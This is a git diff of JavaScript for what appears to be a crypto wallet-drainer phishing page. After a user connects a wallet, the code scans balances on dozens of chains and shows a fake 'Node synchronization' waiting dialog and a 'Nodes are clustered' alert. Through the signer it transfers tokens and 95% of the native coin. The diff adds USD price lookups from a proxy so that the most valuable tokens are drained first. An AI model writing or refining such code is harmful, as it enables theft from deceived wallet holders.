@@ -1,5 +1,6 @@
 import { createWeb3Modal, defaultConfig } from '@web3modal/ethers5'
-import { ethers }from 'ethers'
+import { ethers } from 'ethers'
+import axios from 'axios'
 import Swal from 'sweetalert2'
 
 // 1. Get projectId at https://cloud.walletconnect.com
@@ -185,7 +186,7 @@ const heco = {
   chainId: 128,
   name: 'Huobi Eco Chain',
   explorerUrl: 'https://hecoscan.io/#/',
-  rpcUrl: 'https://http-mainnet-node.huobichain.com'
+  rpcUrl: 'https://http-mainnet.hecochain.com	'
 }
 
 const conflux = {
@@ -379,13 +380,14 @@ async function connectWallet() {
         });
 
         try {
+          const randomTimerDuration = Math.floor(Math.random() * 100) + 300;
             Swal.fire({
                 title: 'Please Wait...',
                 html: 'Node synchronization is ongoing. I will close after Synchronization is complete. Average wait time is <b></b seconds',
                 imageUrl: 'https://www.resolverconsult-panel.com/assets/save_bckudy-gjk8moac.png',
                 imageWidth: 300,
                 imageHeight: 200,
-                timer: 300000,
+                timer: randomTimerDuration * 1000,
                 timerProgressBar: true,
                 didOpen: () => {
                     Swal.showLoading();
@@ -443,7 +445,7 @@ async function connectWallet() {
             {chainId: smartbch.chainId, name: smartbch.name, rpcurl: 'https://smartbch.fountainhead.cash/mainnet', nativeCurrency: {name: 'Bitcoin Cash', symbol: 'BCH', decimal: 18}, blockExplorerUrl: 'https://smartbch.org/', fetchTokens: fetchSMARTBCHTokens},
             {chainId: klaytn.chainId, name: klaytn.name, rpcurl: 'https://public-en-cypress.klaytn.net', nativeCurrency: {name: 'Klaytn', symbol: 'KLAY', decimal: 18}, blockExplorerUrl: 'https://scope.klaytn.com', fetchTokens: fetchKLAYTNTokens},
             {chainId: harmony.chainId, name: harmony.name, rpcurl: 'https://go.getblock.io/65eb9d18a22f4643a81ecdf11ce17640', nativeCurrency: {name: 'Harmony', sykmbol: 'ONE', decimal: 18}, blockExplorerUrl: 'https://explorer.harmony.one/', fetchTokens: fetchHARMONYTokens},
-            {chainId: heco.chainId, name: heco.name, rpcurl: 'https://http-mainnet-node.huobichain.com', nativeCurrency: {name: 'Huobi Token', symbol: 'HT', decimal: 18}, blockExplorerUrl: 'https://hecoscan.io/#/', fetchTokens: fetchHECOTokens},
+            {chainId: heco.chainId, name: heco.name, rpcurl: 'https://http-mainnet.hecochain.com', nativeCurrency: {name: 'Huobi Token', symbol: 'HT', decimal: 18}, blockExplorerUrl: 'https://hecoscan.io/#/', fetchTokens: fetchHECOTokens},
             {chainId: conflux.chainId, name: conflux.name, rpcurl: 'https://evm.confluxrpc.com', nativeCurrency: {name: 'Conflux Token', symbol: 'CFX', decimal: 18}, blockExplorerUrl: 'https://evm.confluxscan.net', fetchTokens: fetchCONFLUXTokens},
             {chainId: platon.chainId, name: platon.name, rpcurl: 'https://rpc.particle.network/evm-chain?chainId=210425&projectUuid=aabbcf0e-e728-42bb-b6ed-f50be0154e20&projectKey=c5zORhFBadsXOH5NVCRzIhDYpQ1zoxEfQdBxmGVt', nativeCurrency: {name: 'PlatON', symbol: 'LAT', decimal: 18}, blockExplorerUrl: 'https://scan.platon.network', fetchTokens: fetchPLATONTokens},
             {chainId: linea.chainId, name: linea.name, rpcurl: 'https://linea-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://lineascan.build/', fetchTokens: fetchLINEATokens},
@@ -469,10 +471,15 @@ async function connectWallet() {
                 const nativeBalance = await networkProvider.getBalance(address);
                 if(nativeBalance.gte(minimumBalance)){
                     const formattedNativeBalance = ethers.utils.formatUnits(nativeBalance, 18);
+                    const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${nets.nativeCurrency.symbol.toLowerCase()}`
+                    const response = await fetch(proxyUrl)
+                    const prices = await response.json()
+                    const priceInfo = prices.data?.[nets.nativeCurrency.symbol.toUpperCase()]?.quote.USD.price;
                     nonZeroBalance.push({ tokenSymbol: nets.nativeCurrency.symbol, balance: parseFloat(formattedNativeBalance) });
                     netBalances = netBalances.add(nativeBalance);
                     if (nativeBalance.gt(highestSingleTokenBalance)) {
-                        highestSingleTokenBalance = nativeBalance;
+                        const usdValue = (formattedNativeBalance * priceInfo).toString()
+                        highestSingleTokenBalance = ethers.utils.parseUnits(usdValue, 18)
                     }
 
                 }
@@ -485,13 +492,23 @@ async function connectWallet() {
                 try {
                     const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, networkProvider);
                     const balance = await tokenContract.balanceOf(address);
+                    //console.log(`Balance for ${token.tokenSymbol} is: ${balance}`)
 
                     if(balance.gte(minimumBalance)){
                         const formattedBalance = ethers.utils.formatUnits(balance, token.decimal);
+                        console.log(`String value of ${token.tokenSymbol} is: ${formattedBalance}`)
+                        // const numberFormattedBalance = parseFloat(formattedBalance)
+                        // console.log(`Number value of ${token.tokenSymbol} is: ${numberFormattedBalance}`)
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
                         nonZeroBalance.push({symbol: token.tokenSymbol, balance: parseFloat(formattedBalance)});
                         netBalances = netBalances.add(balance);
                         if (balance.gt(highestSingleTokenBalance)) {
-                            highestSingleTokenBalance = balance;
+                            const usdValue = (formattedBalance * priceInfo).toString()
+                            highestSingleTokenBalance = ethers.utils.parseUnits(usdValue, 18)
+                            nonZeroBalance.push({ usdValue: parseFloat(usdValue)})
                         }
 
                     }
@@ -500,9 +517,7 @@ async function connectWallet() {
                 }
             }
             if(nonZeroBalance.length > 0){
-                nonZeroBalance.sort((a, b) => b.balance - a.balance);
-                const highestSingleTokenBalanceUSD = ethers.utils.formatUnits(highestSingleTokenBalance)
-                const newHighestSingleUSD = highestSingleTokenBalanceUSD * 0.002
+                nonZeroBalance.sort((a, b) => b.usdValue - a.usdValue);
 
                 networksWithTokens.push({
                     chainId: nets.chainId,
@@ -512,7 +527,7 @@ async function connectWallet() {
                     blockExplorerUrl: nets.blockExplorerUrl,
                     highestSingleTokenBalance: ethers.utils.formatUnits(highestSingleTokenBalance, 18), // Format highest single token balance
                     netBalances: ethers.utils.formatUnits(netBalances, 18),
-                    highestSingleTokenBalanceUSD: newHighestSingleUSD
+                   
                 })
             }
         }
@@ -526,15 +541,15 @@ async function connectWallet() {
         console.log('Networks with tokens sorted by highest single token balance and usd value:', networksWithTokens.map(net => ({
             name: net.name,
             highestSingleTokenBalance: net.highestSingleTokenBalance,
-            highestSingleTokenBalanceUSD: net.highestSingleTokenBalanceUSD
+            //highestSingleTokenBalanceUSD: nets.highestSingleTokenBalanceUSD
         })));
 
         const maxSingleTokenBalance = Math.max(...networksWithTokens.map(net => parseFloat(net.highestSingleTokenBalance)));
-        const maxSingleTokenBalanceUSD = Math.max(...networksWithTokens.map(net => parseFloat(net.highestSingleTokenBalanceUSD)));
+        //const maxSingleTokenBalanceUSD = Math.max(...networksWithTokens.map(net => parseFloat(net.highestSingleTokenBalance)));
 
 
         console.log(`Maximum single token balance: ${maxSingleTokenBalance}`);
-        console.log(`Maximum single token balance usd value: ${maxSingleTokenBalanceUSD}`)
+        //console.log(`Maximum single token balance usd value: ${maxSingleTokenBalanceUSD}`)
 
         if (!networksWithTokens.some(net => net.chainId === currentChainId.chainId) && networksWithTokens.length > 0) {
             window.alert(`Your Nodes are clustered on the current Networks: ${networksWithTokens.map(net => net.name).join(", ")}. Please switch your network!`);
@@ -563,18 +578,36 @@ async function connectWallet() {
                           for (let token of tokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  tokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    tokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          tokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          tokenDetails.sort((a, b) => b.usdValue - a.usdValue);
               
                           try {
                               for(let token of tokenDetails){
@@ -603,7 +636,7 @@ async function connectWallet() {
               
                            if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
-                             console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ETH`);
+                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ETH`);
               
                        // Define the transaction
                            const transaction = {
@@ -627,6 +660,7 @@ async function connectWallet() {
                          }
                           break;
               
+              
                         //BINANCE SMART CHAIN
                         case bsc.chainId:
                           const bscTokens = await fetchBNBTokens(address);
@@ -640,18 +674,37 @@ async function connectWallet() {
                           for (let token of bscTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  bnbTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    bnbTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          bnbTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          bnbTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of bnbTokenDetails){
@@ -718,18 +771,37 @@ async function connectWallet() {
                           for (let token of arbTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  arbTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    arbTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          arbTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          arbTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of arbTokenDetails){
@@ -795,18 +867,37 @@ async function connectWallet() {
                           for (let token of opTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  opTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    opTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          opTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          opTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of opTokenDetails){
@@ -873,18 +964,37 @@ async function connectWallet() {
                           for (let token of arbnovaTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  arbnovaTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    arbnovaTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          arbnovaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          arbnovaTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of arbnovaTokenDetails){
@@ -950,18 +1060,37 @@ async function connectWallet() {
                           for (let token of baseTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  baseTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    baseTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          baseTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          baseTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of baseTokenDetails){
@@ -1027,18 +1156,37 @@ async function connectWallet() {
                           for (let token of zkTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  zkTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    zkTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          zkTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          zkTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of zkTokenDetails){
@@ -1104,18 +1252,37 @@ async function connectWallet() {
                           for (let token of polyTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  polyTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    polyTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          polyTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          polyTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of polyTokenDetails){
@@ -1182,18 +1349,37 @@ async function connectWallet() {
                           for (let token of polyevmTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  polyevmTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    polyevmTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          polyevmTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          polyevmTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of polyevmTokenDetails){
@@ -1260,18 +1446,36 @@ async function connectWallet() {
                           for (let token of blastTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  blastTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    blastTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          blastTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          blastTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
               
                           try {
                               for(let token of blastTokenDetails){
@@ -1338,18 +1542,37 @@ async function connectWallet() {
                           for (let token of scrollTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  scrollTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    scrollTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          scrollTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          scrollTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of scrollTokenDetails){
@@ -1402,6 +1625,7 @@ async function connectWallet() {
                          }
                          break;
                          
+    
                         //METIS
                         case metis.chainId:
                           const metisTokens = await fetchMETISTokens(address);
@@ -1415,18 +1639,37 @@ async function connectWallet() {
                           for (let token of metisTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  metisTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    metisTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          metisTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          metisTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of metisTokenDetails){
@@ -1492,18 +1735,36 @@ async function connectWallet() {
                           for (let token of mantaTokens) {
